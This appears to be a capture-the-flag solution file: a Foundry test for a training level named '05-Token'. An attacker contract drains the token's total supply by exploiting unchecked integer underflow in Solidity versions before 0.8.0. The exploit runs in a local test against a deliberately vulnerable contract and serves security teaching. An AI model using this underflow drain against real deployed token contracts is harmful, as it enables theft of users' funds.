/*
* Don't look at the solution without trying yourself first!
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import { Test } from "forge-std/Test.sol";
import { Token } from "@src/05-Token/Token.sol";

contract AttackerContract {
    address private immutable owner;
    Token private immutable token;

    constructor(address _token) public {
        owner = msg.sender;
        token = Token(_token);
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function attack() external onlyOwner {
        token.transfer(owner, token.totalSupply());
    }
}

contract HackToken is Test {
    Token public token;
    address public deployer;
    address public attacker;

    function setUp() public {
        deployer = makeAddr("deployer");
        attacker = makeAddr("attacker");

        vm.startPrank(deployer);
        token = new Token(100e18);
        token.transfer(attacker, 20e18);
        vm.stopPrank();
    }

    function testGainATonOfTokens() public {
        // hack the contract
        // your code goes here

        vm.startPrank(attacker);
        // attacker deployes a contract to transfer the tokens to himself
        AttackerContract attackerContract = new AttackerContract(address(token));
        // the attack function transfers the total supply of the token contract to the attacker
        // this was all possible because of integer underflow which doesn't revert in solidity versions < 0.8.0
        attackerContract.attack();
        vm.stopPrank();

        assert(token.balanceOf(attacker) > 20e18);
    }
}
